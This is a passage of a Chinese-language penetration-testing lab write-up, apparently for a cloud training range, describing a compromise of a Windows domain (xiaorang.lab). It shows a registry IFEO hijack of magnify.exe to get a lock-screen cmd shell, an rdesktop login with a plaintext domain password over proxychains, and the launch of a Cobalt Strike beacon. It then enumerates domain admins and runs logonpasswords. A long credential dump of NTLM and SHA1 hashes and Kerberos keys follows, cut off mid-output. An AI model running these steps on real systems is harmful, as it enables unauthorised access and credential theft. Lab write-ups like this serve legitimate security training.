+<p>不出网，然后前面提示镜像挟持了，这里挟持放大镜</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">REG ADD <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&#34;</span> /v Debugger /t REG_SZ /d <span class="s2">&#34;C:\windows\system32\cmd.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311161836428.png"
+	width="959"
+	height="83"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311161836428_hu9712028186813795202.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311161836428_hu9570364886993034280.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311161836428"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1155"
+		data-flex-basis="2773px"
+	
+></p>
+<p>回到锁定界面用放大镜</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311162123028.png"
+	width="785"
+	height="690"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311162123028_hu18065182222991628327.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311162123028_hu10683103442341313865.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311162123028"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="113"
+		data-flex-basis="273px"
+	
+></p>
+<p>这台机子不出网，用cs进行转发上线</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311164023814.png"
+	width="382"
+	height="289"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311164023814_hu2401898349673793298.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311164023814_hu4078862470307523834.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311164023814"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="317px"
+	
+></p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311164129054.png"
+	width="1876"
+	height="490"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311164129054_hu5657264881220426640.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311164129054_hu14320692232199739505.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311164129054"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="382"
+		data-flex-basis="918px"
+	
+></p>
+<p>这里生成一个beacon.exe，然后用rdesktop的-r参数挂载我kali的磁盘下exe上线</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">proxychains4 rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p <span class="s1">&#39;0d00@0721&#39;</span> -r disk:share<span class="o">=</span>/tmp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311165250038.png"
+	width="782"
+	height="574"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311165250038_hu13453611036679828263.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311165250038_hu10019124780502142380.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311165250038"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="326px"
+	
+></p>
+<p>用放大镜拿的shell执行exe</p>
+<p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311165539867.png"
+	width="592"
+	height="211"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311165539867_hu1568376299959548498.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311165539867_hu16838140836770600330.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311165539867"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="280"
+		data-flex-basis="673px"
+	
+></p>
+<p>上线cs,拿下域控</p>
+<p>查看域管成员</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">shell net group <span class="s2">&#34;domain admins&#34;</span> /domain
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311165918279.png"
+	width="760"
+	height="260"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311165918279_hu15889381455578357292.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311165918279_hu4163272379669616136.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311165918279"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="292"
+		data-flex-basis="701px"
+	
+></p>
+<p>拿密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">logonpasswords
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311170101130.png"
+	width="782"
+	height="449"
+	srcset="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311170101130_hu6973371740122615603.png 480w, /p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%89%93%E9%9D%B6/image-20260311170101130_hu5240863943703565658.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260311170101130"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="174"
+		data-flex-basis="417px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">21891917</span> <span class="o">(</span>00000000:014e0b4d<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">2</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-2
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 16:13:58
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-2
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	 <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * NTLM     : 8f2e9a48501c4ce8574981f323786bfa
+</span></span><span class="line"><span class="cl">	 * SHA1     : ed82695e1805d58b8441f78dbaeb97dc60002772
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">	 * Password : d5 c1 9f <span class="m">33</span> <span class="m">00</span> 1b 0c 8e 9d 6e <span class="m">81</span> 7a 7e ca ce df f6 9c <span class="m">13</span> 5a f0 ff b9 <span class="m">95</span> b5 e4 <span class="m">01</span> <span class="m">74</span> e2 b6 <span class="m">56</span> <span class="m">57</span> <span class="nb">fc</span> <span class="m">74</span> <span class="nb">fc</span> <span class="m">22</span> <span class="m">54</span> ca f8 ed <span class="m">29</span> 2f 1b d7 <span class="m">71</span> ff <span class="m">39</span> 8c ff <span class="m">29</span> d8 a2 <span class="m">05</span> dd b1 <span class="m">95</span> <span class="m">70</span> 4c <span class="m">70</span> 7b fa e0 <span class="m">57</span> c7 <span class="m">89</span> aa c0 <span class="m">80</span> e8 <span class="m">14</span> f0 <span class="m">54</span> e4 <span class="m">61</span> <span class="m">25</span> 3b <span class="m">87</span> c0 de <span class="m">72</span> cf <span class="m">31</span> d2 1c d1 3d <span class="m">56</span> e3 a4 a4 d4 <span class="m">69</span> d5 6d <span class="m">95</span> e9 <span class="m">55</span> ef fd b5 <span class="m">81</span> de b3 <span class="m">39</span> <span class="m">96</span> 3c 2a f5 cc d9 c1 <span class="m">25</span> <span class="m">97</span> <span class="m">33</span> <span class="m">48</span> <span class="m">53</span> f2 9b <span class="m">60</span> 7c e1 b2 <span class="m">62</span> <span class="m">76</span> 6d c9 c8 <span class="m">02</span> d4 aa bc bf <span class="m">80</span> 1c <span class="m">72</span> <span class="m">45</span> f4 <span class="m">23</span> fa 0a d1 <span class="m">39</span> b7 <span class="m">18</span> ca b5 6a ca a6 <span class="m">49</span> <span class="m">44</span> c0 <span class="m">91</span> <span class="m">64</span> <span class="m">13</span> 0a 7c 3a <span class="m">95</span> 0d c2 a1 a1 1b <span class="m">47</span> ef ce <span class="m">12</span> <span class="m">58</span> e8 <span class="m">02</span> <span class="m">26</span> <span class="m">30</span> 1a <span class="nb">fc</span> <span class="m">05</span> <span class="m">72</span> 0f cc 1f <span class="m">09</span> <span class="m">19</span> 1a <span class="m">27</span> <span class="m">46</span> <span class="m">06</span> <span class="m">56</span> <span class="m">57</span> <span class="m">05</span> d2 6a ad <span class="m">89</span> 9a a5 b0 f3 fb <span class="m">93</span> <span class="m">40</span> <span class="m">98</span> <span class="m">82</span> ba <span class="m">09</span> <span class="m">96</span> <span class="m">66</span> 1d <span class="m">80</span> 3f a1 fb <span class="m">23</span> e3 <span class="m">90</span> e8 <span class="m">85</span> 8f <span class="m">86</span> 5b fe e6 7d 9a f3 f0 <span class="m">27</span> b7 b5 <span class="m">57</span> 0a <span class="m">98</span> 0c fd a5 f3 ae <span class="m">97</span> <span class="m">74</span> <span class="m">14</span> 1d 
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">21891893</span> <span class="o">(</span>00000000:014e0b35<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">2</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-2
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 16:13:58
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-2
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	 <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * NTLM     : 8f2e9a48501c4ce8574981f323786bfa
+</span></span><span class="line"><span class="cl">	 * SHA1     : ed82695e1805d58b8441f78dbaeb97dc60002772
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">	 * Password : d5 c1 9f <span class="m">33</span> <span class="m">00</span> 1b 0c 8e 9d 6e <span class="m">81</span> 7a 7e ca ce df f6 9c <span class="m">13</span> 5a f0 ff b9 <span class="m">95</span> b5 e4 <span class="m">01</span> <span class="m">74</span> e2 b6 <span class="m">56</span> <span class="m">57</span> <span class="nb">fc</span> <span class="m">74</span> <span class="nb">fc</span> <span class="m">22</span> <span class="m">54</span> ca f8 ed <span class="m">29</span> 2f 1b d7 <span class="m">71</span> ff <span class="m">39</span> 8c ff <span class="m">29</span> d8 a2 <span class="m">05</span> dd b1 <span class="m">95</span> <span class="m">70</span> 4c <span class="m">70</span> 7b fa e0 <span class="m">57</span> c7 <span class="m">89</span> aa c0 <span class="m">80</span> e8 <span class="m">14</span> f0 <span class="m">54</span> e4 <span class="m">61</span> <span class="m">25</span> 3b <span class="m">87</span> c0 de <span class="m">72</span> cf <span class="m">31</span> d2 1c d1 3d <span class="m">56</span> e3 a4 a4 d4 <span class="m">69</span> d5 6d <span class="m">95</span> e9 <span class="m">55</span> ef fd b5 <span class="m">81</span> de b3 <span class="m">39</span> <span class="m">96</span> 3c 2a f5 cc d9 c1 <span class="m">25</span> <span class="m">97</span> <span class="m">33</span> <span class="m">48</span> <span class="m">53</span> f2 9b <span class="m">60</span> 7c e1 b2 <span class="m">62</span> <span class="m">76</span> 6d c9 c8 <span class="m">02</span> d4 aa bc bf <span class="m">80</span> 1c <span class="m">72</span> <span class="m">45</span> f4 <span class="m">23</span> fa 0a d1 <span class="m">39</span> b7 <span class="m">18</span> ca b5 6a ca a6 <span class="m">49</span> <span class="m">44</span> c0 <span class="m">91</span> <span class="m">64</span> <span class="m">13</span> 0a 7c 3a <span class="m">95</span> 0d c2 a1 a1 1b <span class="m">47</span> ef ce <span class="m">12</span> <span class="m">58</span> e8 <span class="m">02</span> <span class="m">26</span> <span class="m">30</span> 1a <span class="nb">fc</span> <span class="m">05</span> <span class="m">72</span> 0f cc 1f <span class="m">09</span> <span class="m">19</span> 1a <span class="m">27</span> <span class="m">46</span> <span class="m">06</span> <span class="m">56</span> <span class="m">57</span> <span class="m">05</span> d2 6a ad <span class="m">89</span> 9a a5 b0 f3 fb <span class="m">93</span> <span class="m">40</span> <span class="m">98</span> <span class="m">82</span> ba <span class="m">09</span> <span class="m">96</span> <span class="m">66</span> 1d <span class="m">80</span> 3f a1 fb <span class="m">23</span> e3 <span class="m">90</span> e8 <span class="m">85</span> 8f <span class="m">86</span> 5b fe e6 7d 9a f3 f0 <span class="m">27</span> b7 b5 <span class="m">57</span> 0a <span class="m">98</span> 0c fd a5 f3 ae <span class="m">97</span> <span class="m">74</span> <span class="m">14</span> 1d 
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">55331</span> <span class="o">(</span>00000000:0000d823<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Interactive from <span class="m">1</span>
+</span></span><span class="line"><span class="cl">User Name         : DWM-1
+</span></span><span class="line"><span class="cl">Domain            : Window Manager
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 13:48:29
+</span></span><span class="line"><span class="cl">SID               : S-1-5-90-0-1
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	 <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * NTLM     : 8f2e9a48501c4ce8574981f323786bfa
+</span></span><span class="line"><span class="cl">	 * SHA1     : ed82695e1805d58b8441f78dbaeb97dc60002772
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : xiaorang.lab
+</span></span><span class="line"><span class="cl">	 * Password : d5 c1 9f <span class="m">33</span> <span class="m">00</span> 1b 0c 8e 9d 6e <span class="m">81</span> 7a 7e ca ce df f6 9c <span class="m">13</span> 5a f0 ff b9 <span class="m">95</span> b5 e4 <span class="m">01</span> <span class="m">74</span> e2 b6 <span class="m">56</span> <span class="m">57</span> <span class="nb">fc</span> <span class="m">74</span> <span class="nb">fc</span> <span class="m">22</span> <span class="m">54</span> ca f8 ed <span class="m">29</span> 2f 1b d7 <span class="m">71</span> ff <span class="m">39</span> 8c ff <span class="m">29</span> d8 a2 <span class="m">05</span> dd b1 <span class="m">95</span> <span class="m">70</span> 4c <span class="m">70</span> 7b fa e0 <span class="m">57</span> c7 <span class="m">89</span> aa c0 <span class="m">80</span> e8 <span class="m">14</span> f0 <span class="m">54</span> e4 <span class="m">61</span> <span class="m">25</span> 3b <span class="m">87</span> c0 de <span class="m">72</span> cf <span class="m">31</span> d2 1c d1 3d <span class="m">56</span> e3 a4 a4 d4 <span class="m">69</span> d5 6d <span class="m">95</span> e9 <span class="m">55</span> ef fd b5 <span class="m">81</span> de b3 <span class="m">39</span> <span class="m">96</span> 3c 2a f5 cc d9 c1 <span class="m">25</span> <span class="m">97</span> <span class="m">33</span> <span class="m">48</span> <span class="m">53</span> f2 9b <span class="m">60</span> 7c e1 b2 <span class="m">62</span> <span class="m">76</span> 6d c9 c8 <span class="m">02</span> d4 aa bc bf <span class="m">80</span> 1c <span class="m">72</span> <span class="m">45</span> f4 <span class="m">23</span> fa 0a d1 <span class="m">39</span> b7 <span class="m">18</span> ca b5 6a ca a6 <span class="m">49</span> <span class="m">44</span> c0 <span class="m">91</span> <span class="m">64</span> <span class="m">13</span> 0a 7c 3a <span class="m">95</span> 0d c2 a1 a1 1b <span class="m">47</span> ef ce <span class="m">12</span> <span class="m">58</span> e8 <span class="m">02</span> <span class="m">26</span> <span class="m">30</span> 1a <span class="nb">fc</span> <span class="m">05</span> <span class="m">72</span> 0f cc 1f <span class="m">09</span> <span class="m">19</span> 1a <span class="m">27</span> <span class="m">46</span> <span class="m">06</span> <span class="m">56</span> <span class="m">57</span> <span class="m">05</span> d2 6a ad <span class="m">89</span> 9a a5 b0 f3 fb <span class="m">93</span> <span class="m">40</span> <span class="m">98</span> <span class="m">82</span> ba <span class="m">09</span> <span class="m">96</span> <span class="m">66</span> 1d <span class="m">80</span> 3f a1 fb <span class="m">23</span> e3 <span class="m">90</span> e8 <span class="m">85</span> 8f <span class="m">86</span> 5b fe e6 7d 9a f3 f0 <span class="m">27</span> b7 b5 <span class="m">57</span> 0a <span class="m">98</span> 0c fd a5 f3 ae <span class="m">97</span> <span class="m">74</span> <span class="m">14</span> 1d 
+</span></span><span class="line"><span class="cl">	ssp :	
+</span></span><span class="line"><span class="cl">	credman :	
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Authentication Id : <span class="m">0</span> <span class="p">;</span> <span class="m">996</span> <span class="o">(</span>00000000:000003e4<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Session           : Service from <span class="m">0</span>
+</span></span><span class="line"><span class="cl">User Name         : WIN2016$
+</span></span><span class="line"><span class="cl">Domain            : XIAORANG
+</span></span><span class="line"><span class="cl">Logon Server      : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Logon Time        : 2026/3/11 13:48:28
+</span></span><span class="line"><span class="cl">SID               : S-1-5-20
+</span></span><span class="line"><span class="cl">	msv :	
+</span></span><span class="line"><span class="cl">	 <span class="o">[</span>00000003<span class="o">]</span> Primary
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * NTLM     : 8f2e9a48501c4ce8574981f323786bfa
+</span></span><span class="line"><span class="cl">	 * SHA1     : ed82695e1805d58b8441f78dbaeb97dc60002772
+</span></span><span class="line"><span class="cl">	tspkg :	
+</span></span><span class="line"><span class="cl">	wdigest :	
+</span></span><span class="line"><span class="cl">	 * Username : WIN2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG
+</span></span><span class="line"><span class="cl">	 * Password : <span class="o">(</span>null<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	kerberos :	
+</span></span><span class="line"><span class="cl">	 * Username : win2016$
+</span></span><span class="line"><span class="cl">	 * Domain   : XIAORANG.LAB
